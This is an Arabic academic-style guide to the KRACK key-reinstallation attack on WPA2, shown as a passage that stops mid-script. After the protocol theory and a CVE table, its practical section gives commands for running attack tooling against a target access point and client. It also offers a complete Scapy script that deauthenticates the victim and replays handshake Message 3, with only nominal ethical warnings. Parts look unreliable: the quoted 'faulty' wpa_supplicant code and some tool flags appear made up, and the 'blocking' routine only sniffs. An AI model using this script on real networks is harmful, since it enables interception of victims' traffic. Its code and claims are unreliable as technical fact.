# بحث أكاديمي شامل: هجوم KRACK على بروتوكول WPA2
## Key Reinstallation Attack - دراسة تفصيلية في أمن الشبكات اللاسلكية

---

## 📋 الفهرس

1. [المقدمة](#المقدمة)
2. [الخلفية النظرية](#الخلفية-النظرية)
3. [آلية عمل بروتوكول WPA2](#آلية-عمل-بروتوكول-wpa2)
4. [هجوم KRACK: التفاصيل التقنية](#هجوم-krack-التفاصيل-التقنية)
5. [التطبيق العملي](#التطبيق-العملي)
6. [التأثيرات الأمنية](#التأثيرات-الأمنية)
7. [طرق الحماية والتخفيف](#طرق-الحماية-والتخفيف)
8. [الخلاصة](#الخلاصة)
9. [المراجع](#المراجع)

---

## 1. المقدمة {#المقدمة}

### 1.1 نظرة عامة

**KRACK** (اختصار لـ Key Reinstallation Attack) هو هجوم إلكتروني خطير تم اكتشافه في عام 2016 وتم الإعلان عنه رسمياً في أكتوبر 2017 من قبل الباحثين البلجيكيين:
- **Mathy Vanhoef**
- **Frank Piessens** 

من جامعة Leuven البلجيكية.

### 1.2 أهمية الدراسة

يُعتبر هذا الهجوم من أخطر الثغرات الأمنية المكتشفة في تاريخ الشبكات اللاسلكية لأنه:

1. يستهدف **بروتوكول WPA2** الذي يُستخدم لتأمين مليارات الأجهزة عالمياً
2. الثغرة موجودة في **المعيار نفسه** وليس في تطبيق معين
3. يؤثر على **جميع الأجهزة** التي تدعم WPA2 (Android, iOS, Windows, Linux, macOS)
4. أول هجوم ناجح على WPA2 **لا يعتمد على تخمين كلمة المرور**

### 1.3 نطاق التأثير

```
┌─────────────────────────────────────────────────────────┐
│           الأجهزة المتأثرة بهجوم KRACK                 │
├─────────────────────────────────────────────────────────┤
│ • Android 6.0 والإصدارات الأحدث (40%+ من الأجهزة)      │
│ • Linux (جميع التوزيعات)                               │
│ • iOS و macOS                                          │
│ • Windows 7/8/10/11                                    │
│ • أجهزة IoT (الأجهزة الذكية)                          │
│ • نقاط الوصول (Access Points)                         │
│ • أجهزة التوجيه (Routers)                             │
└─────────────────────────────────────────────────────────┘
```

---

## 2. الخلفية النظرية {#الخلفية-النظرية}

### 2.1 تطور بروتوكولات تأمين Wi-Fi

#### تاريخ التطور:

```
1999: WEP (Wired Equivalent Privacy)
      ↓ [ضعيف جداً - مكسور بسهولة]
      
2003: WPA (Wi-Fi Protected Access)
      ↓ [تحسين مؤقت - يستخدم TKIP]
      
2004: WPA2 (IEEE 802.11i)
      ↓ [استخدام AES-CCMP - يُعتبر آمن]
      
2017: اكتشاف KRACK
      ↓ [كشف ثغرة في المعيار نفسه]
      
2018: WPA3 (استجابة لـ KRACK)
      ↓ [استخدام SAE بدلاً من 4-way handshake]
```

### 2.2 المفاهيم الأساسية

#### أ. التشفير في WPA2

```
WPA2 يستخدم:
┌────────────────────────────────────────┐
│ AES (Advanced Encryption Standard)    │
│ • حجم المفتاح: 128, 192, أو 256 بت   │
│ • نمط التشغيل: CCMP أو GCMP            │
│ • قوة التشفير: عالية جداً             │
└────────────────────────────────────────┘
```

#### ب. التسلسل الهرمي للمفاتيح (Key Hierarchy)

```
               PSK/AAA Key (كلمة المرور)
                       ↓
                     PMK (256-bit)
               Pairwise Master Key
                       ↓
            ┌──────────┴──────────┐
            ↓                     ↓
          PTK                   GTK
   Pairwise Transient Key   Group Temporal Key
   (للبيانات الفردية)      (للبيانات الجماعية)
            ↓                     ↓
    ┌───────┴────────┐           ↓
    ↓                ↓           ↓
   KCK             KEK         TK
Key Confirmation  Key       Temporal
    Key          Encryption    Key
                   Key
```

### 2.3 المصطلحات الأساسية

| المصطلح | التعريف | الأهمية |
|---------|---------|---------|
| **Nonce** | عدد عشوائي يُستخدم مرة واحدة فقط | منع إعادة الاستخدام |
| **EAPOL** | Extensible Authentication Protocol Over LAN | بروتوكول المصادقة |
| **MIC** | Message Integrity Code | التحقق من سلامة الرسالة |
| **PMK** | Pairwise Master Key | المفتاح الرئيسي المشترك |
| **PTK** | Pairwise Transient Key | مفتاح الجلسة الفعلي |
| **ANonce** | Authenticator Nonce | عدد عشوائي من الـ AP |
| **SNonce** | Supplicant Nonce | عدد عشوائي من العميل |

---

## 3. آلية عمل بروتوكول WPA2 {#آلية-عمل-بروتوكول-wpa2}

### 3.1 المصافحة الرباعية (4-Way Handshake)

المصافحة الرباعية هي عملية أساسية في WPA2 تُستخدم لإنشاء مفاتيح التشفير بين نقطة الوصول والجهاز العميل.

#### الرسم التوضيحي للمصافحة الرباعية:

```
Client (STA)                                AP (Authenticator)
     │                                           │
     │  [1] EAPOL-Key (ANonce)                  │
     │◄──────────────────────────────────────────│
     │                                           │
     │  [يُنشئ PTK الآن]                         │
     │                                           │
     │  [2] EAPOL-Key (SNonce, MIC)             │
     │──────────────────────────────────────────►│
     │                                           │
     │                         [يُنشئ PTK الآن]  │
     │                                           │
     │  [3] EAPOL-Key (GTK, MIC) + Install PTK  │
     │◄──────────────────────────────────────────│
     │                                           │
     │  [يُثبّت PTK & GTK]                       │
     │                                           │
     │  [4] EAPOL-Key (ACK, MIC)                │
     │──────────────────────────────────────────►│
     │                                           │
     │        ══ بدء التشفير ══                  │
     │                                           │
```

### 3.2 تفصيل كل رسالة

#### **الرسالة 1: AP → Client**

```
محتويات الرسالة:
┌────────────────────────────────────────┐
│ • Protocol Version: 802.1X-2004        │
│ • Packet Type: Key                     │
│ • Key Descriptor: EAPOL WPA2 Key      │
│ • Key Information:                     │
│   - Key Type: Pairwise                 │
│   - Install: False                     │
│   - Key ACK: True                      │
│   - Key MIC: False                     │
│   - Secure: False                      │
│ • Key Length: 16 bytes                 │
│ • Key Replay Counter: 1                │
│ • ANonce: [32 bytes random]            │
│ • Key RSC: 0                           │
│ • Key ID: 0                            │
└────────────────────────────────────────┘
```

**الغرض**: نقطة الوصول ترسل ANonce للعميل لبدء عملية توليد PTK.

#### **الرسالة 2: Client → AP**

```
محتويات الرسالة:
┌────────────────────────────────────────┐
│ • Protocol Version: 802.1X-2004        │
│ • Packet Type: Key                     │
│ • Key Descriptor: EAPOL WPA2 Key      │
│ • Key Information:                     │
│   - Key Type: Pairwise                 │
│   - Install: False                     │
│   - Key ACK: False                     │
│   - Key MIC: True ✓                    │
│   - Secure: False                      │
│ • Key Replay Counter: 1                │
│ • SNonce: [32 bytes random]            │
│ • MIC: [16 bytes]                      │
│ • RSN Information Element              │
└────────────────────────────────────────┘
```

**الغرض**: العميل يرسل SNonce مع MIC لإثبات امتلاكه للـ PMK.

**حساب PTK**:
```python
PTK = PRF-384(
    PMK,
    "Pairwise key expansion",
    Min(AP_MAC, Client_MAC) || 
    Max(AP_MAC, Client_MAC) ||
    Min(ANonce, SNonce) ||
    Max(ANonce, SNonce)
)

# PTK يتكون من:
PTK = KCK (128 bits) || KEK (128 bits) || TK (128 bits)
```

#### **الرسالة 3: AP → Client** ⚠️ **النقطة الحرجة للهجوم**

```
محتويات الرسالة:
┌────────────────────────────────────────┐
│ • Protocol Version: 802.1X-2004        │
│ • Packet Type: Key                     │
│ • Key Information:                     │
│   - Key Type: Pairwise                 │
│   - Install: True ✓ [تثبيت المفتاح]   │
│   - Key ACK: True                      │
│   - Key MIC: True ✓                    │
│   - Secure: True ✓                     │
│   - Encrypted: True ✓                  │
│ • Key Replay Counter: 2                │
│ • GTK (مشفر بـ KEK)                    │
│ • MIC: [16 bytes]                      │
│ • RSN Information Element              │
└────────────────────────────────────────┘
```

**الغرض**: 
- نقطة الوصول تُرسل GTK المشفر
- **تطلب من العميل تثبيت المفاتيح**
- هذه الرسالة قد تُعاد إرسالها عند فقدان الحزم

#### **الرسالة 4: Client → AP**

```
محتويات الرسالة:
┌────────────────────────────────────────┐
│ • Protocol Version: 802.1X-2004        │
│ • Packet Type: Key                     │
│ • Key Information:                     │
│   - Key Type: Pairwise                 │
│   - Key MIC: True ✓                    │
│   - Secure: True ✓                     │
│ • Key Replay Counter: 2                │
│ • MIC: [16 bytes]                      │
└────────────────────────────────────────┘
```

**الغرض**: العميل يؤكد تثبيت المفاتيح - **الاتصال الآن آمن ومشفر**.

### 3.3 إعادة الإرسال والاتصال السريع

```
الاتصال الأول:          إعادة الاتصال:
┌─────────────┐         ┌─────────────┐
│   Msg 1     │         │   Msg 3     │◄── فقط!
│   Msg 2     │         │   Msg 4     │
│   Msg 3     │         └─────────────┘
│   Msg 4     │         اتصال سريع
└─────────────┘         (Fast Reconnection)
مصافحة كاملة
```

**المشكلة الأمنية**: 
- لتسريع إعادة الاتصال، يُعاد إرسال **الرسالة 3 فقط**
- المعيار **يسمح بإعادة إرسالها عدة مرات**
- إذا لم يستقبل AP الرسالة 4، سيُعيد إرسال الرسالة 3
- هذا هو **المدخل لهجوم KRACK** ⚠️

---

## 4. هجوم KRACK: التفاصيل التقنية {#هجوم-krack-التفاصيل-التقنية}

### 4.1 مبدأ الهجوم

**الفكرة الأساسية**: خداع العميل لإعادة تثبيت مفتاح التشفير المُستخدم حالياً.

```
الوضع الطبيعي:                   هجوم KRACK:
┌──────────────┐                 ┌──────────────┐
│ تثبيت PTK   │                 │ تثبيت PTK   │
│ Nonce = 1   │                 │ Nonce = 1   │
│ (استخدام)   │                 │ (استخدام)   │
│    ↓        │                 │    ↓        │
│ Nonce = 2   │                 │ إعادة تثبيت │◄── الهجوم!
│ Nonce = 3   │                 │ PTK نفسه!   │
│ ...         │                 │ Nonce = 1   │◄── إعادة!
└──────────────┘                 │ (إعادة!)    │
                                 └──────────────┘
```

### 4.2 آلية الهجوم خطوة بخطوة

#### **المرحلة 1: الإعداد**

```
┌────────────────────────────────────────────────────┐
│              بيئة الهجوم                          │
├────────────────────────────────────────────────────┤
│                                                    │
│   [Real AP]  ←→  [Attacker]  ←→  [Victim Client] │
│   الـ AP      MitM Position       الضحية          │
│   الحقيقي      موقع الوسيط                        │
│                                                    │
│   الهدف: التحكم في اتصال الضحية                   │
└────────────────────────────────────────────────────┘
```

**متطلبات المهاجم**:
1. التواجد في **نطاق الشبكة اللاسلكية** (< 100 متر)
2. إنشاء **نسخة مزيفة** من الـ AP (Evil Twin)
3. امتلاك **بطاقة شبكة Wi-Fi** تدعم وضع المراقبة
4. أدوات الهجوم (سنغطيها لاحقاً)

#### **المرحلة 2: التنفيذ**

```
Timeline للهجوم:

T0: المصافحة الطبيعية تبدأ
    │
    ├─► [Msg 1] AP → Client: ANonce
    │
    ├─► [Msg 2] Client → AP: SNonce + MIC
    │
    ├─► [Msg 3] AP → Client: GTK + Install PTK
    │                         │
    │                         ├─► Client يُثبت PTK
    │                         └─► Nonce = 0 (reset)
    │
T1: المهاجم يحجب Msg 4
    │
    ├─► [Block] Client → ✗ → AP
    │
T2: AP يُعيد إرسال Msg 3 (Retransmit)
    │
    ├─► [Msg 3] AP → Client: GTK + Install PTK
    │              (نفس المحتوى!)
    │
T3: العميل يُعيد تثبيت PTK! ⚠️
    │
    └─► Nonce يُعاد إلى 0 مرة أخرى!
        (إعادة استخدام Nonce)

النتيجة:
═══════════════════════════════════════════
  تشفير البيانات الجديدة بنفس Nonce القديم!
  إمكانية فك التشفير!
═══════════════════════════════════════════
```

#### **المرحلة 3: استغلال إعادة استخدام Nonce**

**كيف يعمل التشفير في WPA2:**

```python
# التشفير الطبيعي
encrypted_frame_1 = AES_CCMP(plaintext_1, PTK, nonce=1)
encrypted_frame_2 = AES_CCMP(plaintext_2, PTK, nonce=2)
encrypted_frame_3 = AES_CCMP(plaintext_3, PTK, nonce=3)

# بعد إعادة تثبيت المفتاح (KRACK)
encrypted_frame_1 = AES_CCMP(plaintext_1, PTK, nonce=1)
# ... normal encryption
encrypted_frame_N = AES_CCMP(plaintext_N, PTK, nonce=N)
# [KRACK happens]
encrypted_frame_NEW = AES_CCMP(plaintext_NEW, PTK, nonce=1) # ⚠️ إعادة!
```

**استغلال إعادة الاستخدام:**

```
إذا كان:
  C1 = P1 ⊕ Keystream(nonce=1)
  C2 = P2 ⊕ Keystream(nonce=1)  ← نفس الـ nonce!

إذاً:
  C1 ⊕ C2 = (P1 ⊕ Keystream) ⊕ (P2 ⊕ Keystream)
          = P1 ⊕ P2
          
يمكن استخراج النصوص المشفرة بالتحليل الإحصائي!
```

### 4.3 أنواع هجمات KRACK

#### **نوع 1: إعادة تثبيت PTK في المصافحة الرباعية**

```
CVE-2017-13077 (الأعلى تأثيراً)
┌────────────────────────────────────────┐
│ الهدف: Pairwise Transient Key (PTK)   │
│ التأثير: فك تشفير جميع البيانات       │
│ الخطورة: عالية جداً ⚠️⚠️⚠️           │
└────────────────────────────────────────┘
```

#### **نوع 2: إعادة تثبيت GTK**

```
CVE-2017-13078, CVE-2017-13080
┌────────────────────────────────────────┐
│ الهدف: Group Temporal Key (GTK)       │
│ التأثير: فك تشفير البيانات الجماعية   │
│ الخطورة: متوسطة إلى عالية            │
└────────────────────────────────────────┘
```

#### **نوع 3: هجمات على Fast Roaming (802.11r)**

```
CVE-2017-13082, CVE-2017-13084
┌────────────────────────────────────────┐
│ الهدف: FT Handshake                    │
│ التأثير: استهداف الشبكات المؤسسية     │
│ الخطورة: عالية في البيئات المؤسسية   │
└────────────────────────────────────────┘
```

#### **نوع 4: هجمات على PeerKey وTDLS**

```
CVE-2017-13086, CVE-2017-13087, CVE-2017-13088
┌────────────────────────────────────────┐
│ الهدف: اتصالات P2P المباشرة           │
│ التأثير: محدود (استخدام نادر)         │
│ الخطورة: منخفضة إلى متوسطة            │
└────────────────────────────────────────┘
```

### 4.4 الثغرة الأخطر: All-Zero Key Installation

هذه الثغرة تؤثر بشكل خاص على **Linux و Android 6.0+**:

```
المشكلة:
┌──────────────────────────────────────────────┐
│ في wpa_supplicant (تطبيق شائع في Linux):   │
│                                              │
│ 1. عند استقبال Msg 3 لأول مرة:             │
│    → تثبيت PTK                               │
│    → مسح PTK من الذاكرة (لأسباب أمنية!)    │
│                                              │
│ 2. عند إعادة إرسال Msg 3:                   │
│    → محاولة إعادة تثبيت PTK                  │
│    → لكن PTK = 0x00000... (صفر!)            │
│    → تشفير بمفتاح صفري = لا تشفير!          │
│                                              │
└──────────────────────────────────────────────┘

النتيجة الكارثية:
═══════════════════════════════════════════════
  جميع البيانات تُرسل دون تشفير فعلي!
  المهاجم يستطيع قراءة كل شيء مباشرة!
═══════════════════════════════════════════════
```

**الكود المُعيب** (wpa_supplicant):

```c
// في ملف wpa.c
void wpa_sm_set_key(struct wpa_sm *sm, ...)
{
    if (sm->key_installed) {
        // إذا كان المفتاح مثبتاً سابقاً
        wpa_sm_remove_key(sm); // مسح المفتاح! ⚠️
    }
    
    // تثبيت المفتاح الجديد
    if (key == NULL) {
        // إذا كان المفتاح = NULL
        key = all_zeros_key; // استخدام مفتاح صفري! ⚠️⚠️⚠️
    }
    
    driver_set_key(sm, key);
    sm->key_installed = 1;
}
```

### 4.5 الثغرات الـ 10 في KRACK

جدول شامل لجميع الثغرات:

| CVE ID | الوصف | الهدف | التأثير | الخطورة |
|--------|-------|-------|---------|---------|
| **CVE-2017-13077** | إعادة تثبيت PTK في 4-way handshake | PTK | فك تشفير جميع بيانات Unicast | 🔴 عالية جداً |
| **CVE-2017-13078** | إعادة تثبيت GTK في 4-way handshake | GTK | فك تشفير Broadcast/Multicast | 🟠 عالية |
| **CVE-2017-13079** | إعادة تثبيت IGTK | IGTK | هجمات على Management Frames | 🟡 متوسطة |
| **CVE-2017-13080** | إعادة تثبيت GTK في Group Key handshake | GTK | فك تشفير Broadcast/Multicast | 🟠 عالية |
| **CVE-2017-13081** | إعادة تثبيت IGTK في Group Key handshake | IGTK | هجمات على Management Frames | 🟡 متوسطة |
| **CVE-2017-13082** | إعادة تثبيت في FT handshake | PTK | استهداف Fast Roaming | 🟠 عالية |
| **CVE-2017-13084** | إعادة تثبيت STK في PeerKey | STK | هجمات P2P | 🟢 منخفضة |
| **CVE-2017-13086** | إعادة تثبيت TDLS PeerKey | TPK | هجمات TDLS | 🟢 منخفضة |
| **CVE-2017-13087** | إعادة تثبيت GTK عبر WNM-Sleep | GTK | تجاوز الحماية | 🟡 متوسطة |
| **CVE-2017-13088** | إعادة تثبيت IGTK عبر WNM-Sleep | IGTK | تجاوز الحماية | 🟡 متوسطة |

---

## 5. التطبيق العملي {#التطبيق-العملي}

### 5.1 بيئة الاختبار

#### المتطلبات:

```
┌─────────────────────────────────────────────────┐
│              بيئة المختبر                      │
├─────────────────────────────────────────────────┤
│                                                 │
│ 1. نظام التشغيل:                               │
│    • Kali Linux 2024.x أو أحدث                 │
│    • Ubuntu 22.04 LTS                          │
│    • Arch Linux (محدث)                         │
│                                                 │
│ 2. البطاقات اللاسلكية:                         │
│    • بطاقة تدعم Monitor Mode                   │
│    • بطاقة تدعم Packet Injection               │
│    • مُوصى بها: Alfa AWUS036NHA                │
│                 TP-Link TL-WN722N v1           │
│                                                 │
│ 3. الأدوات البرمجية:                           │
│    • aircrack-ng suite                         │
│    • Wireshark/tshark                          │
│    • Python 3.x                                │
│    • Scapy                                     │
│    • krackattacks-scripts                      │
│                                                 │
│ 4. الأجهزة المستهدفة (للاختبار):              │
│    • هاتف Android قديم (للاختبار الآمن)        │
│    • جهاز Linux VM                             │
│    • Access Point للاختبار فقط                 │
│                                                 │
│ ⚠️ تحذير أخلاقي:                              │
│    • الاختبار فقط على شبكاتك الخاصة            │
│    • الحصول على إذن كتابي من مالك الشبكة      │
│    • هجمات KRACK على شبكات الغير جريمة!       │
└─────────────────────────────────────────────────┘
```

### 5.2 إعداد البيئة

#### **الخطوة 1: تثبيت الأدوات الأساسية**

```bash
# تحديث النظام
sudo apt update && sudo apt upgrade -y

# تثبيت الأدوات الأساسية
sudo apt install -y \
    aircrack-ng \
    wireshark \
    tshark \
    python3 \
    python3-pip \
    git \
    hostapd \
    dnsmasq \
    iptables

# تثبيت مكتبات Python
pip3 install scapy pycryptodome

# تثبيت krackattacks-scripts
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# تثبيت المتطلبات
pip3 install -r requirements.txt
```

#### **الخطوة 2: إعداد البطاقة اللاسلكية**

```bash
# التحقق من البطاقات المتاحة
iwconfig

# إيقاف Network Manager (لتجنب التداخل)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# تفعيل وضع المراقبة
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# التحقق من وضع المراقبة
iwconfig wlan0mon
# يجب أن ترى: Mode:Monitor
```

#### **الخطوة 3: إعداد Access Point للاختبار**

```bash
# إنشاء ملف تكوين hostapd
sudo nano /etc/hostapd/hostapd-test.conf
```

**محتوى الملف**:

```ini
# واجهة الشبكة
interface=wlan1

# الإعدادات الأساسية
driver=nl80211
ssid=KRACK-Test-Lab
hw_mode=g
channel=6
ieee80211n=1

# إعدادات WPA2
wpa=2
wpa_passphrase=TestPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# تفعيل IEEE 802.11w (لاختبار KRACK على IGTK)
ieee80211w=1

# Logging للتحليل
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
```

```bash
# تشغيل Access Point
sudo hostapd /etc/hostapd/hostapd-test.conf
```

### 5.3 تنفيذ هجوم KRACK - الطريقة الأولى (استخدام krackattacks-scripts)

#### **خطوة بخطوة:**

**1. فحص الشبكات المتاحة**

```bash
# بدء المراقبة
sudo airodump-ng wlan0mon

# ستظهر لك الشبكات بهذا الشكل:
# BSSID              PWR  Beacons  #Data  CH  MB   ENC  SSID
# AA:BB:CC:DD:EE:FF  -50       42     15   6  54e  WPA2 KRACK-Test-Lab
```

**2. تشغيل السكريبت الأساسي**

```bash
cd krackattacks-scripts

# تنفيذ الهجوم
sudo ./krack-all-zero-tk.py \
    --interface wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF \
    --target-mac 11:22:33:44:55:66 \
    --channel 6
```

**شرح المعاملات**:
- `--interface`: البطاقة اللاسلكية في وضع المراقبة
- `--bssid`: عنوان MAC لنقطة الوصول المستهدفة
- `--target-mac`: عنوان MAC للجهاز الضحية
- `--channel`: قناة الـ Wi-Fi

**3. مراقبة التنفيذ**

```
Output المتوقع:
════════════════════════════════════════════════════
[+] Starting KRACK attack against client
[+] Waiting for 4-way handshake...
[+] Captured Message 1 of 4
[+] Captured Message 2 of 4
[+] Captured Message 3 of 4
[!] Blocking Message 4
[+] Replaying Message 3...
[✓] Client reinstalled PTK!
[✓] Nonce reuse detected!
[✓] Client is vulnerable to KRACK!
════════════════════════════════════════════════════
```

**4. التقاط البيانات المفككة**

```bash
# في نافذة طرفية جديدة
sudo wireshark -i wlan0mon -k -f "wlan addr2 11:22:33:44:55:66"

# أو استخدام tshark للتحليل
sudo tshark -i wlan0mon \
    -f "wlan addr2 11:22:33:44:55:66" \
    -w krack-capture.pcap
```

### 5.4 تنفيذ الهجوم - الطريقة الثانية (سكريبت Python مخصص)

#### **سكريبت شامل للهجوم:**

```python
#!/usr/bin/env python3
"""
KRACK Attack Implementation - للأغراض التعليمية فقط
تحذير: استخدام هذا السكريبت على شبكات الغير غير قانوني
"""

from scapy.all import *
from scapy.layers.dot11 import *
import time
import sys

class KRACKAttack:
    def __init__(self, interface, target_bssid, target_client):
        """
        تهيئة الهجوم
        
        Args:
            interface: واجهة الشبكة في وضع المراقبة
            target_bssid: عنوان MAC لنقطة الوصول
            target_client: عنوان MAC للعميل المستهدف
        """
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_client = target_client
        self.channel = 6
        self.msg3_captured = None
        self.replay_counter = 0
        
    def sniff_handshake(self):
        """التقاط المصافحة الرباعية"""
        print("[*] Sniffing for 4-way handshake...")
        
        def packet_handler(pkt):
            # التحقق من أن الحزمة EAPOL
            if pkt.haslayer(EAPOL):
                # استخراج معلومات المفتاح
                eapol = pkt[EAPOL]
                
                # التحقق من أنها من/إلى الهدف
                if pkt.addr1 == self.target_client or \
                   pkt.addr2 == self.target_client:
                    
                    # تحديد نوع الرسالة
                    key_info = struct.unpack(">H", 
                        bytes(eapol)[5:7])[0]
                    
                    # الرسالة 3: Key ACK=1, Key MIC=1, Secure=1, Install=1
                    if (key_info & 0x0388) == 0x0388:
                        print("[+] Captured Message 3 of handshake!")
                        self.msg3_captured = pkt
                        return True
            return False
        
        # بدء الاستماع
        sniff(iface=self.interface, 
              prn=packet_handler,
              stop_filter=lambda x: self.msg3_captured is not None,
              timeout=60)
        
        return self.msg3_captured is not None
    
    def block_msg4(self):
        """حجب الرسالة 4 من الوصول لنقطة الوصول"""
        print("[*] Blocking Message 4...")
        
        def block_handler(pkt):
            if pkt.haslayer(EAPOL) and pkt.addr2 == self.target_client:
                eapol = pkt[EAPOL]
                key_info = struct.unpack(">H", bytes(eapol)[5:7])[0]
                
                # الرسالة 4: Key MIC=1, Secure=1, NO Install
                if (key_info & 0x0108) == 0x0108 and \
                   not (key_info & 0x0040):
                    print("[!] Blocked Message 4!")
                    return True  # إيقاف الاستماع
            return False
        
        # بدء الحجب (في الواقع نحن فقط نراقب ولا نمرر)
        sniff(iface=self.interface,
              prn=lambda x: None,  # تجاهل الحزمة
              stop_filter=block_handler,
              timeout=5)
    
    def replay_msg3(self, count=3):
        """
        إعادة إرسال الرسالة 3
        
        Args:
            count: عدد مرات الإعادة
        """
        if not self.msg3_captured:
            print("[-] No Message 3 captured!")
            return False
        
        print(f"[*] Replaying Message 3 {count} times...")
        
        for i in range(count):
            # إعادة إرسال الحزمة
            sendp(self.msg3_captured, 
                  iface=self.interface,
                  verbose=False)
            
            print(f"[+] Replay {i+1}/{count} sent")
            time.sleep(1)
            
            # حجب الرسالة 4 المحتملة
            self.block_msg4()
        
        print("[✓] Message 3 replay completed!")
        return True
    
    def detect_nonce_reuse(self, timeout=30):
        """
        كشف إعادة استخدام Nonce (مؤشر على نجاح الهجوم)
        """
        print("[*] Monitoring for nonce reuse...")
        
        nonces_seen = set()
        reuse_detected = False
        
        def nonce_handler(pkt):
            nonlocal reuse_detected
            
            if pkt.haslayer(Dot11WEP) and pkt.addr2 == self.target_client:
                # استخراج PN (Packet Number / Nonce)
                try:
                    wep = pkt[Dot11WEP]
                    # PN موجود في أول 6 بايتات من CCMP header
                    pn = wep.iv + bytes([wep.keyid])[:2]
                    
                    if pn in nonces_seen:
                        print(f"[✓✓✓] NONCE REUSE DETECTED!")
                        print(f"[✓] Client is VULNERABLE to KRACK!")
                        reuse_detected = True
                        return True
                    
                    nonces_seen.add(pn)
                except:
                    pass
            
            return False
        
        sniff(iface=self.interface,
              prn=nonce_handler,
              stop_filter=lambda x: reuse_detected,
              timeout=timeout)
        
        return reuse_detected
    
    def run_attack(self):
        """تنفيذ الهجوم الكامل"""
        print("=" * 60)
        print("KRACK Attack - Educational Purpose Only")
        print("=" * 60)
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Target AP: {self.target_bssid}")
        print(f"[*] Target Client: {self.target_client}")
        print("=" * 60)
        
        # الخطوة 1: التقاط المصافحة
        if not self.sniff_handshake():
            print("[-] Failed to capture handshake!")
            print("[*] Tip: Try deauthenticating the client to force reconnection")
            return False
        
        # الخطوة 2: إعادة إرسال الرسالة 3
        if not self.replay_msg3(count=5):
            print("[-] Failed to replay Message 3!")
            return False
        
        # الخطوة 3: كشف إعادة استخدام Nonce
        if self.detect_nonce_reuse():
            print("\n" + "=" * 60)
            print("[✓✓✓] ATTACK SUCCESSFUL!")
            print("[✓] Target is vulnerable to KRACK")
            print("[*] You can now decrypt captured traffic")
            print("=" * 60)
            return True
        else:
            print("[-] No nonce reuse detected")
            print("[*] Target may be patched or attack failed")
            return False

def deauth_client(interface, bssid, client, count=10):
    """
    إرسال حزم Deauthentication لفصل العميل
    (لإجباره على إعادة الاتصال والمصافحة)
    """
    print(f"[*] Sending {count} deauth packets...")
    
    # إنشاء حزمة Deauth
    dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
    deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    # إرسال الحزم
    sendp(deauth, iface=interface, count=count, inter=0.1, verbose=False)
    print("[+] Deauth packets sent")
    time.sleep(2)

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) != 4:
        print("Usage: python3 krack_attack.py <interface> <AP_MAC> <Client_MAC>")
        print("Example: python3 krack_attack.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66")
        sys.exit(1)
    
    interface = sys.argv[1]
    ap_mac = sys.argv[2]
    client_mac = sys.argv[3]
    
    # التحقق من الصلاحيات
    if os.geteuid() != 0:
        print("[-] This script requires root privileges!")
        sys.exit(1)
    
    # سؤال المستخدم للتأكيد
    print("\n⚠️  WARNING: This tool is for educational purposes only!")
    print("⚠️  Attacking networks you don't own is illegal!")
    confirm = input("\nDo you have permission to test this network? (yes/no): ")
    
    if confirm.lower() != "yes":
        print("[-] Aborted by user")
        sys.exit(0)
    
    # فصل العميل أولاً لإجباره على إعادة الاتصال
    deauth_client(interface, ap_mac, client_mac, count=5)
    
    # بدء الهجوم
    attacker = KRACKAttack(interface, ap_mac, client_mac)
    attacker.run_attack()

if __name__ == "__main__":
    main()
```

#### **استخدام السكريبت:**

```bash
# حفظ السكريبت
nano krack_attack.py
# [لصق الكود أعلاه]

# إعطاء صلاحيات التنفيذ
chmod +x krack_attack.py

# تشغيل الهجوم
sudo python3 krack_attack.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66
```

### 5.5 تحليل البيانات المُلتقطة

#### **استخدام Wireshark لتحليل PCAP:**

```bash
# فتح ملف الالتقاط
wireshark krack-capture.pcap
```

**فلاتر مفيدة في Wireshark:**

```
# عرض حزم EAPOL فقط
eapol

# عرض إطارات البيانات المشفرة
wlan.fc.type_subtype == 0x0028

# كشف إعادة استخدام Packet Number
wlan.ccmp.extiv && wlan.ta == 11:22:33:44:55:66

# عرض المصافحة الرباعية الكاملة
(eapol) && (wlan.addr == AA:BB:CC:DD:EE:FF || wlan.addr == 11:22:33:44:55:66)
```

#### **سكريبت تحليل إعادة استخدام Nonce:**

```python
#!/usr/bin/env python3
"""
تحليل ملف PCAP للكشف عن إعادة استخدام Nonce
"""

from scapy.all import *
from collections import defaultdict

def analyze_nonce_reuse(pcap_file):
    """
    تحليل ملف PCAP للكشف عن إعادة استخدام Nonce
    
    Args:
        pcap_file: مسار ملف PCAP
    """
    print(f"[*] Analyzing {pcap_file}...")
    
    # قراءة الحزم
    packets = rdpcap(pcap_file)
    
    # تتبع Nonces لكل عميل
    client_nonces = defaultdict(list)
    
    # معالجة كل حزمة
    for pkt in packets:
        if pkt.haslayer(Dot11WEP):
            # استخراج عنوان المُرسل
            src = pkt.addr2
            
            try:
                # استخراج PN من CCMP header
                wep_layer = pkt[Dot11WEP]
                pn = wep_layer.iv + bytes([wep_layer.keyid])[:2]
                
                # التحقق من إعادة الاستخدام
                if pn in client_nonces[src]:
                    print(f"\n[✓] NONCE REUSE DETECTED!")
                    print(f"    Client: {src}")
                    print(f"    Nonce: {pn.hex()}")
                    print(f"    [!] Client is vulnerable to KRACK!")
                    return True
                
                client_nonces[src].append(pn)
                
            except Exception as e:
                pass
    
    print("\n[-] No nonce reuse detected")
    print("[*] Clients may be patched or no attack occurred")
    return False

def extract_handshakes(pcap_file):
    """استخراج المصافحات الرباعية من ملف PCAP"""
    print(f"[*] Extracting handshakes from {pcap_file}...")
    
    packets = rdpcap(pcap_file)
    handshakes = []
    current_hs = []
    
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            current_hs.append(pkt)
            
            # إذا جمعنا 4 رسائل
            if len(current_hs) == 4:
                handshakes.append(current_hs)
                print(f"[+] Found complete 4-way handshake")
                current_hs = []
    
    print(f"[*] Total handshakes found: {len(handshakes)}")
    return handshakes

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
